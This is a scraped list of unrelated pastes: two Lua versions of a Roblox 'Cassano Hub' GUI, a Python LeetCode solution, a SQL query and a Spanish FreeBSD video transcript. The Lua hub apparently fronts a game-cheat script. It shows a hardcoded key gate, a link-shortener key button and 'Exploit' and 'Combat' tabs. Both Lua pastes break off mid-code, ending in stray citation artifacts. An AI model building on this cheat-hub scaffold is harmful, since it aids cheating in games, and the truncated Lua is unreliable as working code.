            unique_tracker += 1

        return replace_tracker"
qkxKYdLp,Just cassano 2,Ehieisaac123,Lua,Thursday 10th of April 2025 09:45:55 AM CDT,"local Players = game:GetService(""Players"")
local player = Players.LocalPlayer
local gui = Instance.new(""ScreenGui"", player:WaitForChild(""PlayerGui""))
gui.Name = ""CassanoHub""

-- Yin-Yang Background
local bg = Instance.new(""ImageLabel"", gui)
bg.Size = UDim2.new(1, 0, 1, 0)
bg.Position = UDim2.new(0, 0, 0, 0)
bg.Image = ""rbxassetid://11719621788"" -- Yin-Yang sky with moon
bg.ImageTransparency = 0.3
bg.ZIndex = 0

-- Key Frame
local KeyFrame = Instance.new(""Frame"", gui)
KeyFrame.Size = UDim2.new(0, 300, 0, 200)
KeyFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
KeyFrame.BackgroundTransparency = 1 -- Fully transparent
KeyFrame.Active = true
KeyFrame.Draggable = true
Instance.new(""UICorner"", KeyFrame)

local Title = Instance.new(""TextLabel"", KeyFrame)
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Text = ""Cassano Hub Key System""
Title.TextColor3 = Color3.new(1, 1, 1)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20
Title.BackgroundTransparency = 1

local KeyBox = Instance.new(""TextBox"", KeyFrame)
KeyBox.PlaceholderText = ""Enter Key...""
KeyBox.Size = UDim2.new(0.8, 0, 0, 30)
KeyBox.Position = UDim2.new(0.1, 0, 0.35, 0)
KeyBox.Text = """"
KeyBox.Font = Enum.Font.Gotham
KeyBox.TextSize = 16
KeyBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
KeyBox.TextColor3 = Color3.new(1, 1, 1)

local GetKeyButton = Instance.new(""TextButton"", KeyFrame)
GetKeyButton.Text = ""Get Key""
GetKeyButton.Size = UDim2.new(0.4, 0, 0, 30)
GetKeyButton.Position = UDim2.new(0.1, 0, 0.65, 0)
GetKeyButton.Font = Enum.Font.Gotham
GetKeyButton.TextSize = 14
GetKeyButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
GetKeyButton.TextColor3 = Color3.new(1, 1, 1)
GetKeyButton.MouseButton1Click:Connect(function()
    setclipboard(""https://workink.net/1Z2m/r0bk16cn"")
end)

local CheckKeyButton = Instance.new(""TextButton"", KeyFrame)
CheckKeyButton.Text = ""Check Key""
CheckKeyButton.Size = UDim2.new(0.4, 0, 0, 30)
CheckKeyButton.Position = UDim2.new(0.5, 0, 0.65, 0)
CheckKeyButton.Font = Enum.Font.Gotham
CheckKeyButton.TextSize = 14
CheckKeyButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
CheckKeyButton.TextColor3 = Color3.new(1, 1, 1)

-- Main Hub Frame
local HubFrame = Instance.new(""Frame"", gui)
HubFrame.Size = UDim2.new(0, 600, 0, 400)
HubFrame.Position = UDim2.new(0.5, -300, 0.5, -200)
HubFrame.BackgroundTransparency = 1 -- Fully transparent
HubFrame.Visible = false
HubFrame.Active = true
HubFrame.Draggable = true
Instance.new(""UICorner"", HubFrame)

local HubTitle = Instance.new(""TextLabel"", HubFrame)
HubTitle.Size = UDim2.new(1, 0, 0, 30)
HubTitle.Text = ""Cassano Hub""
HubTitle.TextColor3 = Color3.new(1, 1, 1)
HubTitle.Font = Enum.Font.GothamBold
HubTitle.TextSize = 22
HubTitle.BackgroundTransparency = 1

-- Tabs
local Sections = {""Combat"", ""General"", ""Exploit"", ""Misc""}
local CurrentSection = ""Combat""
local Pages = {}

for i, sec in ipairs(Sections) do
    local tab = Instance.new(""TextButton"", HubFrame)
    tab.Size = UDim2.new(0, 140, 0, 25)
    tab.Position = UDim2.new(0, (i - 1) * 145, 0, 30)
    tab.Text = sec
    tab.Font = Enum.Font.Gotham
    tab.TextSize = 14
    tab.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    tab.TextColor3 = Color3.new(1, 1, 1)

    local page = Instance.new(""ScrollingFrame"", HubFrame)
    page.Size = UDim2.new(1, -20, 1, -65)
    page.Position = UDim2.new(0, 10, 0, 60)
    page.CanvasSize = UDim2.new(0, 0, 10, 0)
    page.ScrollBarThickness = 6
    page.BackgroundTransparency = 1
    page.Visible = sec == ""Combat""
    Pages[sec] = page

    local layout = Instance.new(""UIListLayout"", page)
    layout.Padding = UDim.new(0, 5)
    layout.SortOrder = Enum.SortOrder.LayoutOrder

    tab.MouseButton1Click:Connect(function()
        for _, p in pairs(Pages) do p.Visible = false end
        page.Visible = true
        CurrentSection = sec
    end)
end

-- Key Logic
local correctKey = ""cassano123""
CheckKeyButton.MouseButton1Click:Connect(function()
    if KeyBox.Text == correctKey then
        KeyFrame.Visible = false
        HubFrame.Visible = true
    else
        KeyBox.Text = """"
        KeyBox
::contentReference[oaicite:12]{index=12}
 
"
XzSqCCSG,Just cassano,Ehieisaac123,Lua,Thursday 10th of April 2025 09:44:01 AM CDT,"local Players = game:GetService(""Players"")
local player = Players.LocalPlayer
local gui = Instance.new(""ScreenGui"", player:WaitForChild(""PlayerGui""))
gui.Name = ""CassanoHub""

-- Yin-Yang Background
local bg = Instance.new(""ImageLabel"", gui)
bg.Size = UDim2.new(1, 0, 1, 0)
bg.Position = UDim2.new(0, 0, 0, 0)
bg.Image = ""rbxassetid://11719621788"" -- Yin-Yang sky with moon
bg.ImageTransparency = 0.3
bg.ZIndex = 0

-- Key Frame
local KeyFrame = Instance.new(""Frame"", gui)
KeyFrame.Size = UDim2.new(0, 300, 0, 200)
KeyFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
KeyFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
KeyFrame.BackgroundTransparency = 0.5
KeyFrame.Active = true
KeyFrame.Draggable = true
Instance.new(""UICorner"", KeyFrame)

local Title = Instance.new(""TextLabel"", KeyFrame)
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Text = ""Cassano Hub Key System""
Title.TextColor3 = Color3.new(1, 1, 1)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20
Title.BackgroundTransparency = 1

local KeyBox = Instance.new(""TextBox"", KeyFrame)
KeyBox.PlaceholderText = ""Enter Key...""
KeyBox.Size = UDim2.new(0.8, 0, 0, 30)
KeyBox.Position = UDim2.new(0.1, 0, 0.35, 0)
KeyBox.Text = """"
KeyBox.Font = Enum.Font.Gotham
KeyBox.TextSize = 16
KeyBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
KeyBox.TextColor3 = Color3.new(1, 1, 1)

local GetKeyButton = Instance.new(""TextButton"", KeyFrame)
GetKeyButton.Text = ""Get Key""
GetKeyButton.Size = UDim2.new(0.4, 0, 0, 30)
GetKeyButton.Position = UDim2.new(0.1, 0, 0.65, 0)
GetKeyButton.Font = Enum.Font.Gotham
GetKeyButton.TextSize = 14
GetKeyButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
GetKeyButton.TextColor3 = Color3.new(1, 1, 1)
GetKeyButton.MouseButton1Click:Connect(function()
    setclipboard(""https://workink.net/1Z2m/r0bk16cn"")
end)

local CheckKeyButton = Instance.new(""TextButton"", KeyFrame)
CheckKeyButton.Text = ""Check Key""
CheckKeyButton.Size = UDim2.new(0.4, 0, 0, 30)
CheckKeyButton.Position = UDim2.new(0.5, 0, 0.65, 0)
CheckKeyButton.Font = Enum.Font.Gotham
CheckKeyButton.TextSize = 14
CheckKeyButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
CheckKeyButton.TextColor3 = Color3.new(1, 1, 1)

-- Main Hub Frame
local HubFrame = Instance.new(""Frame"", gui)
HubFrame.Size = UDim2.new(0, 600, 0, 400)
HubFrame.Position = UDim2.new(0.5, -300, 0.5, -200)
HubFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
HubFrame.BackgroundTransparency = 0.4
HubFrame.Visible = false
HubFrame.Active = true
HubFrame.Draggable = true
Instance.new(""UICorner"", HubFrame)

local HubTitle = Instance.new(""TextLabel"", HubFrame)
HubTitle.Size = UDim2.new(1, 0, 0, 30)
HubTitle.Text = ""Cassano Hub""
HubTitle.TextColor3 = Color3.new(1, 1, 1)
HubTitle.Font = Enum.Font.GothamBold
HubTitle.TextSize = 22
HubTitle.BackgroundTransparency = 1

-- Tabs
local Sections = {""Combat"", ""General"", ""Exploit"", ""Misc""}
local CurrentSection = ""Combat""
local Pages = {}

for i, sec in ipairs(Sections) do
    local tab = Instance.new(""TextButton"", HubFrame)
    tab.Size = UDim2.new(0, 140, 0, 25)
    tab.Position = UDim2.new(0, (i - 1) * 145, 0, 30)
    tab.Text = sec
    tab.Font = Enum.Font.Gotham
    tab.TextSize = 14
    tab.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    tab.TextColor3 = Color3.new(1, 1, 1)

    local page = Instance.new(""ScrollingFrame"", HubFrame)
    page.Size = UDim2.new(1, -20, 1, -65)
    page.Position = UDim2.new(0, 10, 0, 60)
    page.CanvasSize = UDim2.new(0, 0, 10, 0)
    page.ScrollBarThickness = 6
    page.BackgroundTransparency = 1
    page.Visible = sec == ""Combat""
    Pages[sec] = page

    local layout = Instance.new(""UIListLayout"", page)
    layout.Padding = UDim.new(0, 5)
    layout.SortOrder = Enum.SortOrder.LayoutOrder

    tab.MouseButton1Click:Connect(function()
        for _, p in pairs(Pages) do p.Visible = false end
        page.Visible = true
        CurrentSection = sec
    end)
end

-- Key Logic
local correctKey = ""cassano123""
CheckKeyButton.MouseButton1Click:Connect(function()
    if KeyBox.Text == correctKey then
        KeyFrame.Visible = false
        HubFrame.Visible = true
    else
        KeyBox.Text = """"
        KeyBox.PlaceholderText = ""Wrong key! Try again.""
    end
end)

-- Button Generator
local function makeButton(name, section, callback)
    local btn = Instance.new(""TextButton"")
    btn.Size = UDim2.new(1, -10, 0, 30)
    btn.Text = name
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 14
    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Parent = Pages[section]
    btn.MouseButton1Click:Connect(callback)
end

-- COM
::contentReference[oaicite:0]{index=0}
 
"
HzzFhh6f,Untitled,kirzecy670,MySQL,Thursday 10th of April 2025 09:43:09 AM CDT,"WITH parents AS
  (SELECT uid,
          region,
          full_reg_datetime::date as full_reg_datetime
   FROM analytics.parent_properties
   WHERE full_reg_datetime >= '2025-03-28'
     AND full_reg_datetime < today() - interval '2' DAY),
     actions AS
  (SELECT uid,
          full_reg_datetime,
          count(dt) >= 2 AS flg_2_or_more
   FROM analytics.parent_actions
   JOIN parents USING uid
   GROUP BY 1, 2)
SELECT * FROM actions;"
FwLP0qnr,Untitled,smj007,Python,Thursday 10th of April 2025 09:41:09 AM CDT,"from typing import List

class Solution:
    def removeDuplicates(self, nums: List[int]) -> int:
        if len(nums) <= 2:
            return len(nums)

        unique_tracker = 1
        replace_tracker = 1
        count = 1

        while unique_tracker < len(nums):
            if nums[unique_tracker] == nums[unique_tracker - 1]:
                count += 1
            else:
                count = 1  # new number, reset count

            if count <= 2:
                nums[replace_tracker] = nums[unique_tracker]
                replace_tracker += 1

            unique_tracker += 1

        del nums[replace_tracker:]
        return replace_tracker
"
NBCeVjm5,Auto-generated Spanish transcript of https://www.youtube.com/watch?v=fUR-Q_udWXA,grahamperrin,JSON,Thursday 10th of April 2025 09:40:48 AM CDT,"{
  ""title"": ""🚀 ¡Desafío FreeBSD! Instalación Completa y Configuración Básica en Máquina Virtual 🖥️ - YouTube"",
  ""url"": ""https://www.youtube.com/watch?v=fUR-Q_udWXA"",
  ""sections"": [
    {
      ""name"": """",
      ""lines"": [
        {
          ""0:15"": ""muy buenas y bienvenidos a un nuevo vídeo del canal de soplos Linux en el cual hoy precisamente no vamos a hablar""
        },
        {
          ""0:22"": ""de Linux ya que este tiempo atrás Me retaron a intentar instalar en una máquina virtual free bsd y hoy nos vamos""
        },
        {
          ""0:29"": ""a centrar en ella Pero lo primero vamos a ir a mi carpeta de capturas abrir el""
        },
        {
          ""0:36"": ""pantallazo y darle las gracias a format xt4 Jefferson a Diego Castro neogamer in""
        },
        {
          ""0:43"": ""Cris kelo Linux Joel Martínez taquito suave pachar io Ezequiel Fabián Xavier Monserrat y bito azul por formar parte""
        },
        {
          ""0:51"": ""de la comunidad de miembros del canal de Youtube de soplos linox así que Eternamente""
        },
        {
          ""0:58"": ""agradecido Bueno pues voy a explicaros un poquito En qué consiste free bcd Y""
        },
        {
          ""1:03"": ""así pues entramos en materia free bcd es un sistema operativo de tipo unix""
        },
        {
          ""1:08"": ""conocido por su estabilidad seguridad rendimiento y su licencia permisiva A""
        },
        {
          ""1:13"": ""diferencia de los sistemas gnu Linux que combinan el kernel de Linux con herramientas del proyecto gnu fre bcd es""
        },
        {
          ""1:20"": ""un sistema completo desarrollado como un único proyecto como su propio kernel y""
        },
        {
          ""1:25"": ""herramientas básicas de usuario y de de administración""
        },
        {
          ""1:30"": ""free bsd es un unix original que se llama free bsd tiene sus raíces en el""
        },
        {
          ""1:35"": ""sistema operativo unix que fue desarrollado en los laboratorios de at&t Bell en los años 70 unix fue pionero en""
        },
        {
          ""1:42"": ""el diseño de sistemas operativos multitarea y multiusuario que eso pues también lo podemos ver hoy en día en gnu""
        },
        {
          ""1:49"": ""Linux y Sí hoy me va a tocar hablar de gnu Linux Para que no haya controversias""
        },
        {
          ""1:56"": ""y por otro lado está su pionera que fue bsd que es ber software Distribution que a partir del código""
        },
        {
          ""2:03"": ""fuente de unix un grupo de la Universidad de California en berkley desarrolló una serie de mejoras y""
        },
        {
          ""2:08"": ""modificaciones que resultaron en el en lo que se llamó bsd las primeras versiones de bsd eran modificaciones del""
        },
        {
          ""2:15"": ""unix de at&t pero con el tiempo los desarrolladores de berkley reemplazaron el código original con el suyo propio y""
        },
        {
          ""2:21"": ""bueno para ya para el año 93 más o menos eh nació free bcd tras la desaparición""
        },
        {
          ""2:26"": ""del 386 bcd un sistema operativo n likee para arquitecturas eh Intel basado en""
        },
        {
          ""2:33"": ""bcd un grupo de desarrolladores decidió continuar su desarrollo eh Y esto dio""
        },
        {
          ""2:38"": ""lugar a lo que es free bsd básicamente pero no me voy a enrollar mucho porque si no el vídeo se podría alargar un""
        },
        {
          ""2:44"": ""montón si me pongo ahora a hablar de historia de bsd pero a diferencia de gnu""
        },
        {
          ""2:49"": ""Linux más o menos pues eh Por un lado tenemos gnu que es todo lo que son las""
        },
        {
          ""2:54"": ""herramientas aplicaciones etcétera y por otro el kernel que sería Linux que de normal pues los juntan para montar un""
        },
        {
          ""3:00"": ""sistema operativo en caso de free bcd Pues no tanto el kernel como el núcleo""
        },
        {
          ""3:06"": ""como la base como las herramientas son de free bsd pero sí que podemos utilizar herramientas de Linux programas de Linux""
        },
        {
          ""3:13"": ""entornos de escritorio como puede ser KD eh cinnamon el que quisiéramos xfce""
        },
        {
          ""3:18"": ""genome Y bueno pues se le puede aplicar cosas de de genu pero no Linux ya que el""
        },
        {
          ""3:26"": ""kernel es el propio de fre bcd y bueno lo primero que tendríamos que hacer en este caso sería Descargar la""
        },
        {
          ""3:33"": ""ISO y aviso ya de antemano que free bsd""
        },
        {
          ""3:39"": ""si slackware es complicado de instalar free bsd es una pasada pero una pasada""
        },
        {
          ""3:45"": ""de difícil lo primero que haría es Buscar Free""
        },
        {
          ""3:52"": ""bsd y nos iríamos a la web oficial y aquí pues puede llegar un poquito a""
        },
        {
          ""3:58"": ""confusión porque hay un mon de cosas pero básicamente sería aquí download free bsd ahora mismo la última versión""
        },
        {
          ""4:05"": ""estable es la 14.1 la Legacy la 13.3 y 13.14 la""
        },
        {
          ""4:12"": ""próxima será la 14.2 aunque también hay una versión 13.5""
        },
        {
          ""4:17"": ""en camino de la Legacy se pueden descargar todas Eso sí pero que funcionen o no ya sería otra vaina le""
        },
        {
          ""4:25"": ""damos a descargar y aquí tenemos distintas opciones elige lo que es la arquitectura y elige la imagen Pues en""
        },
        {
          ""4:31"": ""este caso lo que queremos es el Installer amd64 que sería para arquitecturas""
        },
        {
          ""4:39"": ""x86 x64 y descargaría ISO una vez descargada""
        },
        {
          ""4:44"": ""pues configurar yo en mi caso lo voy a configurar en una máquina virtual y procedemos a la instalación Bueno nos""
        },
        {
          ""4:51"": ""sale el bisy menu y para poder empezar a instalarlo A diferencia de de gnu Linux""
        },
        {
          ""4:57"": ""con Group Pues aquí pul haríamos la el uno o dejaríamos la cuenta atrás y ya empieza a arrancar lo que es el""
        },
        {
          ""5:09"": ""instalador de hecho este instalador me recuerda mucho a las primeras versiones de macos 6 que instalaba yo que más o""
        },
        {
          ""5:16"": ""menos iniciaba igual que esto y para el que no lo sepa pues macos x Pues también está basado en unix y se parece bastante""
        },
        {
          ""5:24"": ""más a free bsd que a gnu Linux Bueno ya tenemos aquí lo que es la interfaz para""
        },
        {
          ""5:30"": ""instalar Este es el instalador así tal cual y aquí pues le daríamos a install""
        },
        {
          ""5:36"": ""Ahora nos pide que seleccionemos el mapa de teclas de de nuestro país pues yo en""
        },
        {
          ""5:43"": ""este caso Busco España Si queremos hacer un test Yo le doy ya directamente a""
        },
        {
          ""5:48"": ""continuar con ese y ahora nos pide un hostname pues yo en este caso le voy a poner netbsd por ejemplo y aquí""
        },
        {
          ""5:56"": ""seleccionar eh componentes opcionales para el sistema y lo único""
        },
        {
          ""6:03"": ""que voy a dejar es el lif 32 el resto lo desmar ya que esto es un base System para debug para por si quieres""
        },
        {
          ""6:10"": ""desarrollar algo el kernel por si quieres desarrollar algo en debugging la slip 32 en debug luego los puertos lo""
        },
        {
          ""6:18"": ""que es un árbol de puertos ya que free bsd trabaja con puertos a la hora de instalar""
        },
        {
          ""6:24"": ""paquetes lo que es el árbol de recursos del sistema y para hacer test por lo""
        },
        {
          ""6:31"": ""tanto me quedo con lip 32 le doy a Ok y aquí el particionado como no sé muy""
        },
        {
          ""6:37"": ""bien cómo va el particionado de free bsd lo dejo en auto y no me""
        },
        {
          ""6:44"": ""complico ya que es bastante bastante complejo instalar free bsd y más en una máquina virtual Bueno aquí le damos a""
        },
        {
          ""6:51"": ""install directamente stripe marcamos el disco duro donde lo queremos instalar que a diferencia de gnu Linux que es un""
        },
        {
          ""6:57"": ""sda aquí es un da le doy a Ok y me dice que si quiero""
        },
        {
          ""7:03"": ""destruir lo que tenga el disco duro le digo que sí Y ya empieza la instalación en este""
        },
        {
          ""7:11"": ""caso no voy a cortar el vídeo como suelo hacer con otras versiones de Linux ya""
        },
        {
          ""7:17"": ""que no se demora tanto de hecho solo tiene que instalar la base el kernel y el lip 32 y si os fijáis lleva""
        },
        {
          ""7:23"": ""extensiones txz que me recuerdan a las extensiones que utilizas lightware Y es que""
        },
        {
          ""7:29"": ""slackware al igual que free bcd Pues están basados más en unix puro ya que""
        },
        {
          ""7:36"": ""slackware aunque no deja de ser un Linux tiene muchas características unix a""
        },
        {
          ""7:42"": ""diferencia del resto de distribuciones de Linux Así que vamos a esperar unos unos""
        },
        {
          ""7:48"": ""segundos no sé Lo que tardará no suele tardar mucho en instalar y seguimos con el vídeo pero vamos que no lo voy a""
        },
        {
          ""7:54"": ""cortar bien ya se ha instalado Ahora nos pide una contraseña de root""
        },
        {
          ""8:00"": ""y que la repitamos y ya tenemos Root con contraseña Ahora nos dice que""
        },
        {
          ""8:05"": ""seleccionemos la interfaz de red le damos a Ok si queremos configurar el""
        },
        {
          ""8:11"": ""ipv4 le digo que sí Si queremos configurar dhcp le digo que""
        },
        {
          ""8:18"": ""sí Y si queremos configurar ipv6 le voy a decir que no para no demorar mucho y""
        },
        {
          ""8:24"": ""le damos a OK ahora nos pide lo que es el Time zone la zona horaria yo""
        },
        {
          ""8:29"": ""selecciono Europa Busco España península le digo""
        },
        {
          ""8:35"": ""que sí y nos nos remite para que revisemos aquí por ejemplo me marca que""
        },
        {
          ""8:42"": ""son las 10 y en verdad son las 8 lo cambiaría y aquí configuraciones del""
        },
        {
          ""8:48"": ""sistema pues lo dejo tal cual como mucho Le añadiría lo que es el el Pointer en""
        },
        {
          ""8:54"": ""consola del mouse y le daría a Ok y aquí no voy a instalar nada más le doy a Ok y""
        },
        {
          ""9:00"": ""dice que si quiero Añadir algún usuario al sistema le digo que sí y añadimos a""
        },
        {
          ""9:07"": ""soplos el nombre completo sería soplos Linux el ID que me lo ponga automático""
        },
        {
          ""9:13"": ""si lo quiero Añadir algún grupo le voy a decir que me lo añada Will a Will""
        },
        {
          ""9:19"": ""nuevamente y el resto lo dejo por""
        },
        {
          ""9:25"": ""default nos pide una contraseña para el nuevo usuario la adimos y el resto""
        },
        {
          ""9:30"": ""nuevamente por default ya nos ha creado el usuario nos pregunta que si queremos crear un usuario nuevo le digo que no y""
        },
        {
          ""9:38"": ""nos vuelve a lo que es el gestor de instalación le damos a salir y nos dice""
        },
        {
          ""9:43"": ""que si queremos eh seguir navegando con el con el sistema le digo que no y que""
        },
        {
          ""9:50"": ""reinicie bien vemos que nos arranca el visty menu y aquí pues marcarías la tecla uno""
        },
        {
          ""9:57"": ""para que nos arranque free bcd""
        },
        {
          ""10:03"": ""bien ya tenemos free beses instalado y efectivamente no tiene entorno gráfico no tiene escritorio no tiene nada""
        },
        {
          ""10:10"": ""absolutamente Y en este en este punto es donde tenemos que tomar la decisión de""
        },
        {
          ""10:15"": ""qué es lo que queremos instalar porque de normal free bsd viene así para crearlo para un servidor para un sistema""
        },
        {
          ""10:22"": ""de red para lo que quisiéramos pero en este caso lo que vamos a hacer es instalarle un escritorio un entorno""
        },
        {
          ""10:27"": ""gráfico para poder utilizarlo como un workstation No pues bien lo primero que vamos a hacer es loguear noos como Root""
        },
        {
          ""10:34"": ""y añadimos nuestra contraseña de Root y ya estamos dentro de free bsd qué Qué""
        },
        {
          ""10:39"": ""vamos a hacer lo primero pues instalar pkg para poder instalar paquetes y tan sencillo como escribir pkg nos dice que""
        },
        {
          ""10:46"": ""si lo queremos instalar le digo que sí y ya nos ha instalado pkg voy a""
        },
        {
          ""10:54"": ""limpiar la pantalla con un podéis hacer un Clear o simplemente con un control l""
        },
        {
          ""11:00"": ""al igual que en cualquier distribución de Linux os funciona igual y bien lo primero primerísimo que hago es un pkg""
        },
        {
          ""11:08"": ""update y un pkg upgrade por Si hubiesen""
        },
        {
          ""11:14"": ""actualizaciones y no la sabría el siguiente paso yo como usuario de Linux""
        },
        {
          ""11:20"": ""estoy acostumbrado a ciertas herramientas de Linux y por suerte pues las podemos también instalar en free bcd""
        },
        {
          ""11:27"": ""por lo tanto las voy a instalar pkg instal Y en este caso pues Quiero instalar principalmente sudo para poder""
        },
        {
          ""11:34"": ""acceder con mi usuario como un Root Nano para poder modificar archivos cool por""
        },
        {
          ""11:41"": ""si tuviera que descargar algo git por si tuviera que descargar algo más wiget por""
        },
        {
          ""11:47"": ""si tengo que trasladar algún repositorio y también fuse por si las moscas a""
        },
        {
          ""11:53"": ""posterior me va a hacer falta nos dice que va a descargar 128""
        },
        {
          ""11:59"": ""paetes que van a pesar en torno a 123 megas que si procedemos le digo que sí y""
        },
        {
          ""12:04"": ""que me instale todo lo que le he""
        },
        {
          ""12:11"": ""pedido bien una vez ha terminado de instalar las utilidades que necesito limpio la pantalla y lo primero que voy""
        },
        {
          ""12:17"": ""a hacer es Añadir Eh mi usuario a sud doers y para ello en""
        },
        {
          ""12:24"": ""cualquier distribución de Linux sería con un sudo Nano por ejemplo o un Nano bar etc Bars pero unix la distribución""
        },
        {
          ""12:33"": ""de carpetas es distinta creo que ya lo comenté en el vídeo de slackware ya que""
        },
        {
          ""12:38"": ""slackware es un ejemplo de que lleva un sistema de""
        },
        {
          ""12:43"": ""directorios mezclado entre unix y mezclado entre gn Linux ya que por""
        },
        {
          ""12:49"": ""ejemplo etc en unix tenemos un etc en raíz que sería sl etc pero todo lo que""
        },
        {
          ""12:56"": ""tiene que ver con el sistema está en otro directorio que es el loser local etc en este caso no bueno os lo enseño y""
        },
        {
          ""13:04"": ""así lo veis más gráficamente si hago un ls aquí veis que salen estas opciones""
        },
        {
          ""13:09"": ""pero si hago un CD barra punto y hago un ls Ya estamos en la raíz del sistema""
        },
        {
          ""13:16"": ""como podéis observar Pues por aquí tenemos dev al igual que en Linux eh user bar Root media Bin home net sis""
        },
        {
          ""13:27"": ""pero si os fijáis no hay ningún etc Por qué Porque está en ls bar user""
        },
        {
          ""13:38"": ""barra local y aquí ya vemos que tenemos otro Bin otro etc un include un Live un Live""
        },
        {
          ""13:46"": ""Data un le exe un sbin y un share porque está todo dentro de local dentro de user""
        },
        {
          ""13:52"": ""local por lo tanto para poder Modificar el fichero de sers tendríamos que hacer""
        },
        {
          ""13:57"": ""un Nano barra user bar local bar etc""
        },
        {
          ""14:04"": ""Bars y ya estamos dentro del fichero sare esto para un usuario que recién""
        },
        {
          ""14:10"": ""llega Linux puede ser una auténtica Locura De hecho yo me he vuelto loco""
        },
        {
          ""14:15"": ""para poder instalar varias veces free bsd Pero al final lo he conseguido y más o menos Pues al igual que con cualquier""
        },
        {
          ""14:22"": ""otra distribución avanzada de gn Linux pues al final se instala no""
        },
        {
          ""14:29"": ""Bueno lo primero que hago es Añadir a soplos el usuario como Root voy a desmarcar Will y ya que estoy""
        },
        {
          ""14:37"": ""pues me voy abajo del todo y al igual que hago siempre en Linux Pues aquí hago un""
        },
        {
          ""14:44"": ""default m reset coma pw""
        },
        {
          ""14:49"": ""feedback para que me muestre los asteriscos cuando me pide la contraseña como Root guardo con un control o intro""
        },
        {
          ""14:58"": ""control x y salgo bien ya una vez que tengo al""
        },
        {
          ""15:03"": ""usuario como Root pues ya puedo aquí limpiar otra vez la lo que es la pantalla y ahora pues voy a darle""
        },
        {
          ""15:10"": ""privilegios al usuario para distintos grupos para ello voy a hacer un""
        },
        {
          ""15:16"": ""pw user Mode soplos en mi caso en vuestro caso""
        },
        {
          ""15:22"": ""el usuario que queráis menos G mayúscula y aquí pues aunque ya lo he""
        },
        {
          ""15:27"": ""añadido lo vuelvo a ir a Will a vídeo para cuando pueda configurar todo lo que""
        },
        {
          ""15:33"": ""es un entorno gráfico y a operator ya con esos estando el usuario""
        },
        {
          ""15:41"": ""en esos grupos pues ya más o menos voy a poder trabajar de forma fluida Cuál es el siguiente paso decidir el entorno""
        },
        {
          ""15:48"": ""gráfico que vamos a utilizar y el sistema de escritorio yo en esta ocasión""
        },
        {
          ""15:53"": ""Voy a instalar x11 lo que es sh y voy a instalar cade""
        },
        {
          ""15:59"": ""5 si os interesa pues podríamos hacer un vídeo futuro instalando wand y por""
        },
        {
          ""16:05"": ""ejemplo kad plasma 6 o cualquier otro escritorio pero en este caso me voy a ir a lo a lo que mejor me conozco ya que es""
        },
        {
          ""16:12"": ""lo que trabajo con slackware y me resultará más cómodo Y posiblemente menos largo el vídeo Y bueno pues lo""
        },
        {
          ""16:19"": ""primero que vamos a hacer para que tengamos un entorno gráfico es instalarlo por lo tanto tendríamos que""
        },
        {
          ""16:24"": ""hacer un pkg inst en este caso pues tenemos que""
        },
        {
          ""16:29"": ""instalar shork O xorg como le queráis llamar un x11""
        },
        {
          ""16:36"": ""barra mm plasma 5 gu""
        },
        {
          ""16:43"": ""plasma para tener lo que es plasma también vamos a instalar un x11 bar kde""
        },
        {
          ""16:52"": ""5 y necesitamos algo que que unifique todo que es sddm en este caso y yo creo""
        },
        {
          ""17:00"": ""que con eso por ahora suficiente bien nos dice que va a""
        },
        {
          ""17:06"": ""instalar 844 paquetes que una vez que estén descargados van a ocupar unos 6 GB""
        },
        {
          ""17:15"": ""y que tiene que Descargar 2 gb le decimos que sí y aquí sí que se puede demorar un ratito Así que vamos a parar""
        },
        {
          ""17:22"": ""aquí el vídeo y cuando termine de instalar continuamos bien una vez que ha terminado de instalar eh KD plasma x11 y""
        },
        {
          ""17:32"": ""sddm pues nos aparece esto lo primero que dice que tenemos que Añadir estos""
        },
        {
          ""17:37"": ""servicios para que vayan un poquito mejor para incrementar lo que es el wofer lo que es el tamaño del buer pues""
        },
        {
          ""17:43"": ""lo vamos a hacer tal y como nos pone Isis zl""
        },
        {
          ""17:48"": ""nlocal Stream punto""
        },
        {
          ""17:57"": ""r space igual a 65""
        },
        {
          ""18:06"": ""536 y le hemos ampliado la memoria del wofer y ahora pues tenemos que hacer lo mismo con el Send space pues vamos aquí""
        },
        {
          ""18:14"": ""y ponemos Send space y ya nos los ha ampliado bien Ahora el siguiente paso es""
        },
        {
          ""18:20"": ""habilitar los servicios del debus y el sddm para que cuando arranque free bsd""
        },
        {
          ""18:26"": ""Pues arranquen los servicios casi todos los sistemas operativos gn Linux eh van""
        },
        {
          ""18:31"": ""con systemd que lo hace casi de forma automática o algunos como slackware que""
        },
        {
          ""18:37"": ""usan syis vinit o System B como le queréis Llamar que va mediante Run""
        },
        {
          ""18:42"": ""levels y lo tenemos que configurar en un rc No pues free bsd prácticamente es""
        },
        {
          ""18:49"": ""igual que que slackware va con ran levels pero no mediante sis vinit Va""
        },
        {
          ""18:57"": ""pues si nos vamos aquí un ls etc""
        },
        {
          ""19:02"": ""rcd vemos que tenemos una carpeta en etc rcd donde tenemos todo lo que son los""
        },
        {
          ""19:08"": ""servicios y va mediante un fichero que si hacemos un cad bar etc""
        },
        {
          ""19:17"": ""bar rc.com Pues aquí Bueno voy a limpiarlo""
        },
        {
          ""19:23"": ""porque si no no lo Vais a ver tenemos lo que son los servicios que están añadidos ya a ese rc para que inicien con el""
        },
        {
          ""19:31"": ""sistema bien pues ahora tenemos que habilitar el debas para que inicie todo""
        },
        {
          ""19:36"": ""lo que es el sistema gráfico y pues para ello tendríamos que hacer un sis""
        },
        {
          ""19:42"": ""rc de bas enable""
        },
        {
          ""19:47"": ""igual Yes y lo que hemos hecho ha ido Añadir ese servicio el debus O debas""
        },
        {
